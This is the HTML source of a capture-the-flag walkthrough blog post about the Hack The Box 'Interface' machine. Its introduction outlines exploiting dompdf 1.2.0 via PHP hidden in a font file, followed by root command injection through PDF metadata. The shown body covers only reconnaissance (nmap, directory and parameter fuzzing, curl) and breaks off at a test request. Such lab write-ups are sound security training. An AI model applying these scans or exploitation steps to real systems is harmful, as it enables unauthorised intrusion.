@@ -1,0 +1,623 @@
+<!doctype html><html lang=en><head><script async src="https://www.googletagmanager.com/gtag/js?id=G-EQK3ZBE0XH"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-EQK3ZBE0XH")</script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Interface HTB Walkthrough - emdwyer</title><meta name=Description content="emdwyer's personal site - development, infosec, security"><meta property="og:title" content="Interface HTB Walkthrough"><meta property="og:description" content="Introduction After some tricky enumeration where I initially miss the obvious, we find and fuzz an API endpoint which converts HTML input to PDF. Looking at the resulting PDF with exiftool, we find dompdf 1.2.0 is used. This is vulnerable to injecting arbitrary PHP into a font file, which the server will execute once included in a stylesheet. Knowing this, we serve up a style sheet, TTF font containing malicious PHP and pass a reference to our stylesheet to the vulnerable API point."><meta property="og:type" content="article"><meta property="og:url" content="https://emdwyer.github.io/2023-05-13-interface-htb/"><meta property="og:image" content="https://emdwyer.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-13T00:00:00+10:00"><meta property="article:modified_time" content="2023-05-13T13:50:55+10:00"><meta property="og:site_name" content="emdwyer"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://emdwyer.github.io/logo.png"><meta name=twitter:title content="Interface HTB Walkthrough"><meta name=twitter:description content="Introduction After some tricky enumeration where I initially miss the obvious, we find and fuzz an API endpoint which converts HTML input to PDF. Looking at the resulting PDF with exiftool, we find dompdf 1.2.0 is used. This is vulnerable to injecting arbitrary PHP into a font file, which the server will execute once included in a stylesheet. Knowing this, we serve up a style sheet, TTF font containing malicious PHP and pass a reference to our stylesheet to the vulnerable API point."><meta name=application-name content="emdwyer"><meta name=apple-mobile-web-app-title content="emdwyer"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://emdwyer.github.io/2023-05-13-interface-htb/><link rel=prev href=https://emdwyer.github.io/2023-04-22-investigation-htb/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Interface HTB Walkthrough","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/emdwyer.github.io\/2023-05-13-interface-htb\/"},"image":["https:\/\/emdwyer.github.io\/images\/Apple-Devices-Preview.png"],"genre":"posts","keywords":"htb, security, penetration testing, pdf, rce, exif, CVE-2022-28368","wordcount":3150,"url":"https:\/\/emdwyer.github.io\/2023-05-13-interface-htb\/","datePublished":"2023-05-13T00:00:00+10:00","dateModified":"2023-05-13T13:50:55+10:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"emdwyer","logo":"https:\/\/emdwyer.github.io\/avatar.jpg"},"author":{"@type":"Person","name":"emdwyer"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/>About </a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i> </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/about/ title>About</a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i></a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Interface HTB Walkthrough</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>emdwyer</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-05-13>2023-05-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;3150 words&nbsp;
+<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;15 minutes&nbsp;<span id=/2023-05-13-interface-htb/ class=leancloud_visitors data-flag-title="Interface HTB Walkthrough">
+<i class="far fa-eye fa-fw" aria-hidden=true></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
+<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div></div><div class=content id=content><p><img class=lazyload src=/svg/loading.min.svg data-src=./interface.png data-srcset="./interface.png, ./interface.png 1.5x, ./interface.png 2x" data-sizes=auto alt=./interface.png title=Interface></p><h2 id=introduction>Introduction</h2><p>After some tricky enumeration where I initially miss the obvious, we find and fuzz an API endpoint which converts HTML input to PDF. Looking at the resulting PDF with <code>exiftool</code>, we find dompdf 1.2.0 is used. This is vulnerable to injecting arbitrary PHP into a font file, which the server will execute once included in a stylesheet. Knowing this, we serve up a style sheet, TTF font containing malicious PHP and pass a reference to our stylesheet to the vulnerable API point. With RCE, we then escalate to root by finding a cleanup script vulnerable to command injection. By adding bash code into an arithmetic expression inside a PDF metadata field, we can execute arbitrary code as root.</p><h2 id=enumeration>Enumeration</h2><p>Let&rsquo;s start with an obligatory Nmap scan:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nmap</span> -sC -sV -o nmap/initial 10.10.11.200
+</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-03-26 17:40 AEDT
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.200
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.019s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 7289a0957eceaea8596b2d2dbc90b55a <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 01848c66d34ec4b1611f2d4d389c42c3 <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> cc62905560a658629e6b80105c799b55 <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp open  http    nginx 1.14.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.14.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site Maintenance
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 8.80 seconds
+</span></span></code></pre></td></tr></table></div></div><p>Browsing to the web server found at http://10.10.11.200/:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-03-26-17-42-13-image.png data-srcset="./assets/2023-03-26-17-42-13-image.png, ./assets/2023-03-26-17-42-13-image.png 1.5x, ./assets/2023-03-26-17-42-13-image.png 2x" data-sizes=auto alt=./assets/2023-03-26-17-42-13-image.png title=./assets/2023-03-26-17-42-13-image.png></p><p>Using <a href=https://www.wappalyzer.com/ target=_blank rel="noopener noreffer">Wappalyzer</a>, and looking at Firefox developer tools to see files retrieved (bundled javascript) indicates we&rsquo;re looking at a NextJS project.</p><p>We attempt to enumerate the web server further with a gobuster scan:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$gobuster</span> dir -u http://10.10.11.200 -w /usr/share/dirb/wordlists/common.txt
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Gobuster v3.1.0
+</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://10.10.11.200
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/dirb/wordlists/common.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>2023/03/26 17:43:57 Starting gobuster in directory enumeration <span class=nv>mode</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>/cgi-bin/             <span class=o>(</span>Status: 308<span class=o>)</span> <span class=o>[</span>Size: 8<span class=o>]</span> <span class=o>[</span>--&gt; /cgi-bin<span class=o>]</span>
+</span></span><span class=line><span class=cl>/favicon.ico          <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 15086<span class=o>]</span>           
+</span></span><span class=line><span class=cl>                                                            
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>2023/03/26 17:44:16 <span class=nv>Finished</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span></code></pre></td></tr></table></div></div><p>The <em>contact us</em> on the landing page links to <code>mailto:contact@interface.htb</code>, so we add <code>10.10.11.200 interface.htb</code> to our <code>/etc/hosts</code></p><p>I&rsquo;ll try to keep this a little short, but let&rsquo;s just say I spent a LONG time enumerating. I tried:</p><ul><li><p><code>gobuster dir</code> with different word lists</p></li><li><p><code>gobuster vhost</code> to try find subdomains</p></li><li><p>feroxbuster with different wordlists, and the <code>-m</code> parameter to try <code>GET,POST</code> and other HTTP methods</p></li></ul><p>Despite all this, I only found path <code>/cgi-bin/</code> as above, and while feroxbuster is recursive, it didn&rsquo;t really find much else.</p><p>Backtracking a little, I intercepted all traffic through BurpSuite. While looking at the Site Map feature (super useful!) and seeing which HTTP headers were in the various responses returned, something stood out:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-03-31-19-19-32-image.png data-srcset="./assets/2023-03-31-19-19-32-image.png, ./assets/2023-03-31-19-19-32-image.png 1.5x, ./assets/2023-03-31-19-19-32-image.png 2x" data-sizes=auto alt=./assets/2023-03-31-19-19-32-image.png title=./assets/2023-03-31-19-19-32-image.png></p><p>In the <code>Content-Security-Policy</code> header, we see <a href=http://prd.m.rendering-api.interface.htb target=_blank rel="noopener noreffer">http://prd.m.rendering-api.interface.htb</a> &ndash; a subdomain our enumeration with different tools and wordlists hadn&rsquo;t found</p><p>I tried running feroxbuster against our new subdomain after adding it to <code>/etc/hosts</code>. Then I tried with GET and POST methods using <code>raft-medium-word</code> wordlist:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$./feroxbuster -u http://prd.m.rendering-api.interface.htb/api -m GET,POST -w ~/SecLists/Discovery/Web-Content/raft-medium-words.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> ___  ___  __   __     __      __         __   ___
+</span></span><span class=line><span class=cl><span class=p>|</span>__  <span class=p>|</span>__  <span class=p>|</span>__<span class=o>)</span> <span class=p>|</span>__<span class=o>)</span> <span class=p>|</span> /  <span class=sb>`</span>    /  <span class=se>\ \_</span>/ <span class=p>|</span> <span class=p>|</span>  <span class=se>\ </span><span class=p>|</span>__
+</span></span><span class=line><span class=cl><span class=p>|</span>    <span class=p>|</span>___ <span class=p>|</span>  <span class=se>\ </span><span class=p>|</span>  <span class=se>\ </span><span class=p>|</span> <span class=se>\_</span>_,    <span class=se>\_</span>_/ / <span class=se>\ </span><span class=p>|</span> <span class=p>|</span>__/ <span class=p>|</span>___
+</span></span><span class=line><span class=cl>by Ben <span class=s2>&#34;epi&#34;</span> Risher 🤓                 ver: 2.9.2
+</span></span><span class=line><span class=cl>───────────────────────────┬──────────────────────
+</span></span><span class=line><span class=cl> 🎯  Target Url            │ http://prd.m.rendering-api.interface.htb/api
+</span></span><span class=line><span class=cl> 🚀  Threads               │ <span class=m>50</span>
+</span></span><span class=line><span class=cl> 📖  Wordlist              │ /home/zara/SecLists/Discovery/Web-Content/raft-medium-words.txt
+</span></span><span class=line><span class=cl> 👌  Status Codes          │ All Status Codes!
+</span></span><span class=line><span class=cl> 💥  Timeout <span class=o>(</span>secs<span class=o>)</span>        │ <span class=m>7</span>
+</span></span><span class=line><span class=cl> 🦡  User-Agent            │ feroxbuster/2.9.2
+</span></span><span class=line><span class=cl> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+</span></span><span class=line><span class=cl> 🔎  Extract Links         │ <span class=nb>true</span>
+</span></span><span class=line><span class=cl> 🏁  HTTP methods          │ <span class=o>[</span>GET, POST<span class=o>]</span>
+</span></span><span class=line><span class=cl> 🔃  Recursion Depth       │ <span class=m>4</span>
+</span></span><span class=line><span class=cl>───────────────────────────┴──────────────────────
+</span></span><span class=line><span class=cl> 🏁  Press <span class=o>[</span>ENTER<span class=o>]</span> to use the Scan Management Menu™
+</span></span><span class=line><span class=cl>──────────────────────────────────────────────────
+</span></span><span class=line><span class=cl><span class=m>404</span>      GET        1l        3w       50c Auto-filtering found 404-like response and created new filter<span class=p>;</span> toggle off with --dont-filter
+</span></span><span class=line><span class=cl><span class=m>404</span>     POST        1l        3w       50c Auto-filtering found 404-like response and created new filter<span class=p>;</span> toggle off with --dont-filter
+</span></span><span class=line><span class=cl><span class=m>422</span>     POST        1l        2w       36c http://prd.m.rendering-api.interface.htb/api/html2pdf
+</span></span><span class=line><span class=cl><span class=o>[</span><span class=c1>####################] - 1m    126176/126176  0s      found:1       errors:0      </span>
+</span></span><span class=line><span class=cl><span class=o>[</span><span class=c1>####################] - 1m    126176/126176  1449/s  http://prd.m.rendering-api.interface.htb/api/ </span>
+</span></span></code></pre></td></tr></table></div></div><p>POSTing to <a href=http://prd.m.rendering-api.interface.htb/api/html2pdf target=_blank rel="noopener noreffer">http://prd.m.rendering-api.interface.htb/api/html2pdf</a> gives us a HTTP 422 - unprocessable content response. This apparently means a request was well-formed, but syntactically invalid. When cURLing, we see we&rsquo;re missing a parameter:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> -X POST -v http://prd.m.rendering-api.interface.htb/api/html2pdf
+</span></span><span class=line><span class=cl>*   Trying 10.10.11.200:80...
+</span></span><span class=line><span class=cl>* Connected to prd.m.rendering-api.interface.htb <span class=o>(</span>10.10.11.200<span class=o>)</span> port <span class=m>80</span> <span class=o>(</span><span class=c1>#0)</span>
+</span></span><span class=line><span class=cl>&gt; POST /api/html2pdf HTTP/1.1
+</span></span><span class=line><span class=cl>&gt; Host: prd.m.rendering-api.interface.htb
+</span></span><span class=line><span class=cl>&gt; User-Agent: curl/7.88.1
+</span></span><span class=line><span class=cl>&gt; Accept: */*
+</span></span><span class=line><span class=cl>&gt; 
+</span></span><span class=line><span class=cl>&lt; HTTP/1.1 <span class=m>422</span> Unprocessable Entity
+</span></span><span class=line><span class=cl>&lt; Server: nginx/1.14.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl>&lt; Date: Fri, <span class=m>31</span> Mar <span class=m>2023</span> 08:28:19 GMT
+</span></span><span class=line><span class=cl>&lt; Content-Type: application/json
+</span></span><span class=line><span class=cl>&lt; Transfer-Encoding: chunked
+</span></span><span class=line><span class=cl>&lt; Connection: keep-alive
+</span></span><span class=line><span class=cl>&lt; 
+</span></span><span class=line><span class=cl>* Connection <span class=c1>#0 to host prd.m.rendering-api.interface.htb left intact</span>
+</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;status_text&#34;</span>:<span class=s2>&#34;missing parameters&#34;</span><span class=o>}</span>%                              
+</span></span></code></pre></td></tr></table></div></div><p>Fuzzing query params with raft and other wordlists yielded nothing:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -u <span class=s2>&#34;http://prd.m.rendering-api.interface.htb/api/html2pdf?FUZZ=aaa&#34;</span> -X POST -w ~/SecLists/Discovery/Web-Content/raft-medium-words.txt
+</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s fuzz the body as a JSON payload using <a href=https://github.com/ffuf/ffuf target=_blank rel="noopener noreffer">ffuf</a>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$ffuf</span> -u <span class=s2>&#34;http://prd.m.rendering-api.interface.htb/api/html2pdf?FUZZ=aaa&#34;</span> -X POST -w ~/SecLists/Discovery/Web-Content/raft-medium-words.txt -d <span class=s1>&#39;{&#34;FUZZ&#34;: &#34;foo&#34;}&#39;</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        /<span class=s1>&#39;___\  /&#39;</span>___<span class=se>\ </span>          /<span class=err>&#39;</span>___<span class=se>\ </span>      
+</span></span><span class=line><span class=cl>       /<span class=se>\ \_</span>_/ /<span class=se>\ \_</span>_/  __  __  /<span class=se>\ \_</span>_/       
+</span></span><span class=line><span class=cl>       <span class=se>\ \ </span>,__<span class=se>\\</span> <span class=se>\ </span>,__<span class=se>\/\ \/\ \ \ \ </span>,__<span class=se>\ </span>     
+</span></span><span class=line><span class=cl>        <span class=se>\ \ \_</span>/ <span class=se>\ \ \_</span>/<span class=se>\ \ \_\ \ \ \ \_</span>/      
+</span></span><span class=line><span class=cl>         <span class=se>\ \_\ </span>  <span class=se>\ \_\ </span> <span class=se>\ \_</span>___/  <span class=se>\ \_\ </span>      
+</span></span><span class=line><span class=cl>          <span class=se>\/</span>_/    <span class=se>\/</span>_/   <span class=se>\/</span>___/    <span class=se>\/</span>_/       
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>       v1.4.1-dev
+</span></span><span class=line><span class=cl>________________________________________________
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> :: Method           : POST
+</span></span><span class=line><span class=cl> :: URL              : http://prd.m.rendering-api.interface.htb/api/html2pdf?FUZZ<span class=o>=</span>aaa
+</span></span><span class=line><span class=cl> :: Wordlist         : FUZZ: /home/zara/SecLists/Discovery/Web-Content/raft-medium-words.txt
+</span></span><span class=line><span class=cl> :: Data             : <span class=o>{</span><span class=s2>&#34;FUZZ&#34;</span>: <span class=s2>&#34;foo&#34;</span><span class=o>}</span>
+</span></span><span class=line><span class=cl> :: Follow redirects : <span class=nb>false</span>
+</span></span><span class=line><span class=cl> :: Calibration      : <span class=nb>false</span>
+</span></span><span class=line><span class=cl> :: Timeout          : <span class=m>10</span>
+</span></span><span class=line><span class=cl> :: Threads          : <span class=m>40</span>
+</span></span><span class=line><span class=cl> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+</span></span><span class=line><span class=cl>________________________________________________
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>html                    <span class=o>[</span>Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 23ms<span class=o>]</span>
+</span></span><span class=line><span class=cl>:: Progress: <span class=o>[</span>63087/63087<span class=o>]</span> :: Job <span class=o>[</span>1/1<span class=o>]</span> :: <span class=m>1757</span> req/sec :: Duration: <span class=o>[</span>0:00:41<span class=o>]</span> :: Errors: <span class=m>0</span> ::
+</span></span></code></pre></td></tr></table></div></div><p>I mistakenly left a query param here, but nonetheless we find that we can supply <code>html</code> key in the JSON payload when POSTing, and we get a 200 response.</p><p>Next we try a payload, and opening the resulting file to determine the behaviour of the endpoint:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$curl</span> -X POST -H <span class=s2>&#34;Content-Type: application/json&#34;</span> <span class=s2>&#34;http://prd.m.rendering-api.interface.htb/api/html2pdf&#34;</span> -d <span class=s1>&#39;{&#34;html&#34;: &#34;fooooooooooooooooooooooooo&lt;a href=\&#34;bar.com\&#34;&gt;bar&lt;/a&gt;oooooooooooooooooooooooo&#34;}&#39;</span> &gt; out.pdf
+</span></span><span class=line><span class=cl>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+</span></span><span class=line><span class=cl>                                 Dload  Upload   Total   Spent    Left  Speed
+</span></span><span class=line><span class=cl><span class=m>100</span>  <span class=m>1551</span>  <span class=m>100</span>  <span class=m>1462</span>  <span class=m>100</span>    <span class=m>89</span>  <span class=m>25306</span>   <span class=m>1540</span> --:--:-- --:--:-- --:--:-- <span class=m>27210</span>
+</span></span><span class=line><span class=cl><span class=nv>$open</span> out.pdf
